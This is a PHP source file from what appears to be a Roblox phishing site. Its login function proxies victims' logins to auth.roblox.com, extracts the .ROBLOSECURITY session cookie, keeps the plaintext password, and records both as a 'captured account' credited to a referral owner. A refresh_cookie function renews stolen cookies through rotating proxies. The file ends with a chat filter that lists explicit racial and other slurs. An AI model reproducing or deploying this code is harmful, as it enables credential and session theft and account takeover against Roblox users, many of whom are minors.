<?php

require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/configuration/setup.php" );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

function send_cors( ): void
{
    header( "Access-Control-Allow-Origin: *" );
    header( "Access-Control-Allow-Methods: GET, POST, OPTIONS" );
    header( "Access-Control-Allow-Headers: *" );
}

function login( array $incoming_headers, string $raw_body ): string
{
    global $site;

    $incoming_headers = array_change_key_case( $incoming_headers, CASE_LOWER );

    $base_headers = [ "sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\", \"Chromium\";v=\"146\", \"Microsoft Edge WebView2\";v=\"146\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "upgrade-insecure-requests: 1",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site: none",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "accept-encoding: gzip, deflate, br, zstd",
        "accept-language: " . ( $incoming_headers[ "accept-language" ] ?? "en-GB,en;q=0.9,en-US;q=0.8" ),
        "content-type: application/json;charset=UTF-8",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "priority: u=0, i", ];
    foreach ( [ "cookie","sentry-trace","baggage","sec-gpc","idempotency-key","rblx-challenge-id","rblx-challenge-metadata","rblx-challenge-type" ] as $h )
    {
        if ( !empty( $incoming_headers[ $h ] ) )
        {
            $base_headers[ ] = $h . ": " . $incoming_headers[ $h ];
        }
    };
    $base_headers[ ] = "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15";
    $base_headers[ ] = "cookie: rbx-ip2=1; GuestData=UserID=-1744713569; RBXcb=RBXViralAcquisition%3Dfalse%26RBXSource%3Dfalse%26GoogleAnalytics%3Dfalse; RBXSessionTracker=sessionid=05845aae-f205-490a-ab3a-36808c8d0ef6; RBXEventTrackerV2=CreateDate=05/28/2026 13:07:34&rbxid=11017415461&rbxuid=11020701164&browserid=1779991198485001; RBXPaymentsFlowContext=5c136cce-6a60-4243-a540-b885c51dd350,";
    $cookie_file = tempnam( sys_get_temp_dir( ), "rblx_" );

    $make_curl = function ( string $body, array $headers ) use ( $cookie_file )
    {
        $ch = curl_init( "https://auth.roblox.com/v2/login" );
        curl_setopt_array( $ch, [ CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $body,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER         => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_ENCODING       => "",
            CURLOPT_COOKIEFILE     => $cookie_file,
            CURLOPT_COOKIEJAR      => $cookie_file,
            CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5_HOSTNAME,
            CURLOPT_HTTPPROXYTUNNEL => true, ] );
        return $ch;
    };

    $ch_csrf  = $make_curl( "{}", $base_headers );
    $res_csrf = curl_exec( $ch_csrf );
    $hs_csrf  = curl_getinfo( $ch_csrf, CURLINFO_HEADER_SIZE );
    curl_close( $ch_csrf );

    $csrf_token = "";
    foreach ( explode( "\r\n", substr( $res_csrf, 0, $hs_csrf ) ) as $line )
    {
        if ( stripos( $line, "x-csrf-token:" ) === 0 )
        {
            $csrf_token = trim( explode( ":", $line, 2 )[ 1 ] );
            break;
        };
    };

    if ( empty( $csrf_token ) )
    {
        @unlink( $cookie_file );
        send_cors( );
        http_response_code( 500 );
        header( "content-type: text/plain" );
        return "failed to obtain csrf token";
    };

    $login_headers   = $base_headers;
    $login_headers[ ] = "x-csrf-token: " . $csrf_token;
    if ( !empty( $incoming_headers[ "x-bound-auth-token" ] ) )
    {
        $login_headers[ ] = "x-bound-auth-token: " . $incoming_headers[ "x-bound-auth-token" ];
    }

    $ch_login  = $make_curl( $raw_body, $login_headers );
    $res_login = curl_exec( $ch_login );

    if ( $res_login === false )
    {
        @unlink( $cookie_file );
        send_cors( );
        http_response_code( 502 );
        header( "content-type: text/plain" );
        return "curl error: " . curl_error( $ch_login ) . " (" . curl_errno( $ch_login ) . ")";
    };

    $code             = curl_getinfo( $ch_login, CURLINFO_HTTP_CODE );
    $hs_login         = curl_getinfo( $ch_login, CURLINFO_HEADER_SIZE );
    $raw_resp_headers = substr( $res_login, 0, $hs_login );
    curl_close( $ch_login );
    @unlink( $cookie_file );

    $body             = substr( $res_login, $hs_login );
    $content_encoding = "";
    $roblosecurity    = null;
    $skip             = [ "content-length", "transfer-encoding", "connection", "set-cookie" ];

    foreach ( explode( "\r\n", $raw_resp_headers ) as $line )
    {
        if ( strpos( $line, ":" ) === false )
        {
            continue;
        }
        $parts = explode( ":", $line, 2 );
        $name  = strtolower( trim( $parts[ 0 ] ) );
        $value = trim( $parts[ 1 ] );
        $value = preg_replace( "/domain=\.?roblox\.com/i", "domain=." . $_SERVER[ "SERVER_NAME" ], $value );

        if ( $name === "content-encoding" )
        {
            $content_encoding = $value;
        }
        if ( $name === "set-cookie" && preg_match( "/\.ROBLOSECURITY=([^;]+)/i", $line, $m ) )
        {
            $roblosecurity = $m[ 1 ];
        }
        if ( $name === "x-csrf-token" )
        {
            $csrf_token = $value;
        }
        if ( !in_array( $name, $skip ) )
        {
            header( trim( $parts[ 0 ] ) . ": " . $value, false );
        }
    };

    if ( $content_encoding === "gzip" )
    {
        $body = empty( $body ) ? $body : ( @gzdecode( $body ) ?: @gzuncompress( $body ) ?: $body );
        header( "Content-Encoding: none", true );
    };

    if ( $roblosecurity !== null && $code === 200 )
    {
        $secret  = $_COOKIE[ "secret" ] ?? "";
        $webhook = "";
        $referred_by = "";

        $json_body = json_decode( $body, true );
        $username  = $json_body[ "user" ][ "name" ] ?? "Unknown";
        $user_id   = (int)( $json_body[ "user" ][ "id" ] ?? 0 );

        $post_data = json_decode( $raw_body, true );
        if ( !empty( $post_data[ "password" ] ) )
        {
            setcookie( "Pass", $post_data[ "password" ], [ "expires"  => time( ) + 31536000,
                "path"     => "/",
                "secure"   => true,
                "httponly" => false,
                "samesite" => "Lax", ] );
            $_COOKIE[ "Pass" ] = $post_data[ "password" ];
        };

        $owner_id = 0;
        if ( $secret !== "" )
        {
            $owner = get_user_by_referral_code( $secret );
            if ( $owner )
            {
                $owner_id = (int) ( $owner[ "id" ] ?? 0 );
            };
        };

        if ( $owner_id > 0 && $user_id > 0 )
        {
            $password = (string) ( $_COOKIE[ "Pass" ] ?? ( $post_data[ "password" ] ?? "" ) );
            $embed = build_capture_embed_preview( $username, $user_id, $password, (string) $roblosecurity );
            record_captured_account( $owner_id, [
                "roblox_user_id" => $user_id,
                "roblox_username" => $username,
                "roblox_display" => $username,
                "password" => $password,
                "cookie" => (string) $roblosecurity,
                "embed_json" => json_encode( $embed, JSON_UNESCAPED_SLASHES ),
            ] );
        };
    };
    send_cors( );
    http_response_code( $code );
    return $body;
};

function get_random_proxy( ): ?string
{
    $path = $_SERVER[ "DOCUMENT_ROOT" ] . "/api/proxy.txt";
    if ( !file_exists( $path ) )
    {
        return null;
    };
    $lines = array_filter( array_map( "trim", file( $path ) ) );
    if ( empty( $lines ) )
    {
        return null;
    };
    return $lines[ array_rand( $lines ) ];
};

function apply_proxy( $ch, ?string $proxy ): void
{
    if ( !$proxy )
    {
        return;
    };
    curl_setopt( $ch, CURLOPT_PROXY, $proxy );
    $parts = explode( ":", $proxy );
    if ( count( $parts ) === 4 )
    {
        curl_setopt( $ch, CURLOPT_PROXY, $parts[ 0 ] . ":" . $parts[ 1 ] );
        curl_setopt( $ch, CURLOPT_PROXYUSERPWD, $parts[ 2 ] . ":" . $parts[ 3 ] );
    };
};

function refresh_cookie( string $cookie ): array
{
    if ( empty( $cookie ) )
    {
        return [ "success" => false, "message" => "Invalid Cookie" ];
    };

    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/client-assertion/" );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
    ] );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    $response = curl_exec( $ch );
    curl_close( $ch );
    $client_assertion = json_decode( $response, true )[ "clientAssertion" ] ?? null;

    if ( $client_assertion )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/" );
        curl_setopt( $ch, CURLOPT_POST, true );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, "" );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, [
            "user-agent: Roblox/WinINet",
            "content-type: application/json",
            "referer: https://www.roblox.com/",
            "origin: https://www.roblox.com",
            "cookie: .ROBLOSECURITY=" . $cookie,
        ] );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
        curl_setopt( $ch, CURLOPT_HEADER, true );
        $response = curl_exec( $ch );
        $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
        curl_close( $ch );

        $raw_headers = substr( $response, 0, $header_sz );
        $csrf = null;
        foreach ( explode( "\r\n", $raw_headers ) as $line )
        {
            if ( stripos( $line, "x-csrf-token:" ) === 0 )
            {
                $csrf = trim( substr( $line, strlen( "x-csrf-token:" ) ) );
                break;
            };
        };

        if ( $csrf )
        {
            $ch = curl_init( );
            curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/" );
            curl_setopt( $ch, CURLOPT_POST, true );
            curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( [ "clientAssertion" => $client_assertion ] ) );
            curl_setopt( $ch, CURLOPT_HTTPHEADER, [
                "user-agent: Roblox/WinINet",
                "content-type: application/json",
                "referer: https://www.roblox.com/",
                "origin: https://www.roblox.com",
                "cookie: .ROBLOSECURITY=" . $cookie,
                "x-csrf-token: " . $csrf,
            ] );
            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
            curl_setopt( $ch, CURLOPT_HEADER, true );
            $response = curl_exec( $ch );
            $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
            curl_close( $ch );

            $raw_headers = substr( $response, 0, $header_sz );
            $auth_ticket = null;
            foreach ( explode( "\r\n", $raw_headers ) as $line )
            {
                if ( stripos( $line, "rbx-authentication-ticket:" ) === 0 )
                {
                    $auth_ticket = trim( substr( $line, strlen( "rbx-authentication-ticket:" ) ) );
                    break;
                };
            };

            if ( $auth_ticket )
            {
                $ch = curl_init( );
                curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem" );
                curl_setopt( $ch, CURLOPT_POST, true );
                curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( [ "authenticationTicket" => $auth_ticket ] ) );
                curl_setopt( $ch, CURLOPT_HTTPHEADER, [
                    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                    "referer: https://www.roblox.com/",
                    "origin: https://www.roblox.com",
                    "content-type: application/json",
                    "rbxauthenticationnegotiation: 1",
                    "accept: application/json, text/plain, */*",
                    "accept-language: en-US,en;q=0.9",
                    "accept-encoding: gzip, deflate, br",
                    "connection: keep-alive",
                ] );
                curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
                curl_setopt( $ch, CURLOPT_HEADER, true );
                curl_setopt( $ch, CURLOPT_ENCODING, "" );

                $new_cookie = null;
                $start_time = time( );
                while ( true )
                {
                    if ( ( time( ) - $start_time ) >= 10 )
                    {
                        curl_close( $ch );
                        return [ "success" => false, "message" => "Timed Out" ];
                    };
                    $response = curl_exec( $ch );
                    $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
                    $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
                    $raw_headers = substr( $response, 0, $header_sz );

                    if ( $http_code === 429 )
                    {
                        $retry_after = 2;
                        foreach ( explode( "\r\n", $raw_headers ) as $line )
                        {
                            if ( stripos( $line, "retry-after:" ) === 0 )
                            {
                                $retry_after = (int) trim( substr( $line, strlen( "retry-after:" ) ) );
                                break;
                            };
                        };
                        sleep( min( $retry_after, 10 - ( time( ) - $start_time ) ) );
                        continue;
                    };

                    if ( $http_code === 200 )
                    {
                        foreach ( explode( "\r\n", $raw_headers ) as $line )
                        {
                            if ( stripos( $line, "set-cookie:" ) === 0 )
                            {
                                if ( stripos( $line, ".ROBLOSECURITY=" ) !== false )
                                {
                                    preg_match( '/.ROBLOSECURITY=([^;]+)/', $line, $matches );
                                    $new_cookie = $matches[ 1 ] ?? null;
                                    break;
                                };
                            };
                        };
                    };
                    break;
                };
                curl_close( $ch );

                if ( $new_cookie )
                {
                    return [ "success" => true, "cookie" => $new_cookie ];
                };
            };
        };
    };

    $proxy = get_random_proxy( );

    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/" );
    curl_setopt( $ch, CURLOPT_POST, true );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, "" );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "content-type: application/json",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
    ] );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, true );
    apply_proxy( $ch, $proxy );
    $response = curl_exec( $ch );
    $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
    curl_close( $ch );

    $raw_headers = substr( $response, 0, $header_sz );
    $csrf = null;
    foreach ( explode( "\r\n", $raw_headers ) as $line )
    {
        if ( stripos( $line, "x-csrf-token:" ) === 0 )
        {
            $csrf = trim( substr( $line, strlen( "x-csrf-token:" ) ) );
            break;
        };
    };
    if ( !$csrf )
    {
        return [ "success" => false, "message" => "Unknown Token" ];
    };

    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/" );
    curl_setopt( $ch, CURLOPT_POST, true );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "content-type: application/json",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
        "x-csrf-token: " . $csrf,
    ] );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, true );
    apply_proxy( $ch, $proxy );
    $response = curl_exec( $ch );
    $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
    curl_close( $ch );

    $raw_headers = substr( $response, 0, $header_sz );
    $auth_ticket = null;
    foreach ( explode( "\r\n", $raw_headers ) as $line )
    {
        if ( stripos( $line, "rbx-authentication-ticket:" ) === 0 )
        {
            $auth_ticket = trim( substr( $line, strlen( "rbx-authentication-ticket:" ) ) );
            break;
        };
    };
    if ( !$auth_ticket )
    {
        return [ "success" => false, "message" => "Unknown Ticket" ];
    };

    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem" );
    curl_setopt( $ch, CURLOPT_POST, true );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( [ "authenticationTicket" => $auth_ticket ] ) );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, [
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "content-type: application/json",
        "rbxauthenticationnegotiation: 1",
        "accept: application/json, text/plain, */*",
        "accept-language: en-US,en;q=0.9",
        "accept-encoding: gzip, deflate, br",
        "connection: keep-alive",
    ] );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, true );
    curl_setopt( $ch, CURLOPT_ENCODING, "" );
    apply_proxy( $ch, $proxy );

    $new_cookie = null;
    $start_time = time( );
    while ( true )
    {
        if ( ( time( ) - $start_time ) >= 10 )
        {
            curl_close( $ch );
            return [ "success" => false, "message" => "Timed Out" ];
        };
        $response = curl_exec( $ch );
        $header_sz = curl_getinfo( $ch, CURLINFO_HEADER_SIZE );
        $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
        $raw_headers = substr( $response, 0, $header_sz );

        if ( $http_code === 429 )
        {
            $retry_after = 2;
            foreach ( explode( "\r\n", $raw_headers ) as $line )
            {
                if ( stripos( $line, "retry-after:" ) === 0 )
                {
                    $retry_after = (int) trim( substr( $line, strlen( "retry-after:" ) ) );
                    break;
                };
            };
            sleep( min( $retry_after, 10 - ( time( ) - $start_time ) ) );
            continue;
        };

        if ( $http_code !== 200 )
        {
            curl_close( $ch );
            return [ "success" => false, "message" => "HTTP Error " . $http_code ];
        };

        foreach ( explode( "\r\n", $raw_headers ) as $line )
        {
            if ( stripos( $line, "set-cookie:" ) === 0 )
            {
                if ( stripos( $line, ".ROBLOSECURITY=" ) !== false )
                {
                    preg_match( '/.ROBLOSECURITY=([^;]+)/', $line, $matches );
                    $new_cookie = $matches[ 1 ] ?? null;
                    break;
                };
            };
        };
        break;
    };
    curl_close( $ch );

    if ( !$new_cookie )
    {
        return [ "success" => false, "message" => "Failed to extract new cookie" ];
    };
    return [ "cookie" => $new_cookie ];
};

function chat_moderation_terms( ): array
{
    return [
        "nigger",
        "nigga",
        "niggas",
        "chink",
        "gook",
        "wetback",
        "spic",
        "beaner",
        "kike",
        "coon",
        "raghead",
        "towelhead",
        "rape",
        "rapist",
        "raping",
        "raped",
        "molest",
        "molester",
        "molesting",
        "molestation",
        "faggot",
        "fagot",
        "tranny",
        "retard",
        "retarded",
    ];
};

function chat_normalize_token( string $text ): string
{
    $text = mb_strtolower( $text, "UTF-8" );
    $leet = [
        "0" => "o",
        "1" => "i",
        "3" => "e",
        "4" => "a",
        "5" => "s",
        "7" => "t",
        "@" => "a",
        "$" => "s",
        "!" => "i",
    ];
    $text = strtr( $text, $leet );
    return (string) preg_replace( "/[^a-z]/", "", $text );
};

function chat_collapse_repeated_chars( string $text ): string
{
    return (string) preg_replace( "/(.)\1+/u", "$1", $text );
};

function chat_prepare_term( string $term ): string
{
    return chat_collapse_repeated_chars( chat_normalize_token( $term ) );
};

function chat_token_matches_term( string $token, string $term ): bool
{
    if ( $token === "" || $term === "" )
    {
        return false;
    };
    if ( $token === $term )
    {
        return true;
    };
    if ( str_starts_with( $token, $term ) && strlen( $token ) <= strlen( $term ) + 2 )
    {
        return true;
    };
    return false;
};

function chat_compact_false_positive_masks( ): array
{
    return [
        "rape" => [ "grape", "drape", "crape", "scrap" ],
        "coon" => [ "raccoon", "cocoon" ],
    ];
};

function chat_compact_contains_term( string $compact, string $term ): bool
{
    if ( $term === "" || !str_contains( $compact, $term ) )
    {
        return false;
    };
    $scratch = $compact;
    $masks = chat_compact_false_positive_masks( );
    if ( isset( $masks[ $term ] ) )
    {
        foreach ( $masks[ $term ] as $safe )
        {
            $scratch = str_replace( $safe, "", $scratch );
        };
    };
    return str_contains( $scratch, $term );
};

function chat_message_violation( string $message ): ?string
{
    $terms = chat_moderation_terms( );
    $prepared = [ ];
    foreach ( $terms as $term )
    {
        $prepared[ ] = chat_prepare_term( $term );
    };
    $raw = mb_strtolower( $message, "UTF-8" );
    $parts = preg_split( '/[^a-z0-9@$!]+/u', $raw, -1, PREG_SPLIT_NO_EMPTY );
    foreach ( $parts as $piece )
    {
        $token = chat_collapse_repeated_chars( chat_normalize_token( $piece ) );
        if ( $token === "" )
        {
            continue;
        };
        foreach ( $prepared as $term )
        {
            if ( chat_token_matches_term( $token, $term ) )
            {
                return "That message uses language that is not allowed.";
            };
        };
    };
    $compact = chat_collapse_repeated_chars( chat_normalize_token( $message ) );
    if ( $compact === "" )
    {
        return null;
    };
    foreach ( $prepared as $term )
    {
        if ( chat_compact_contains_term( $compact, $term ) )
        {
            return "That message uses language that is not allowed.";
        };
    };
    return null;
};
?>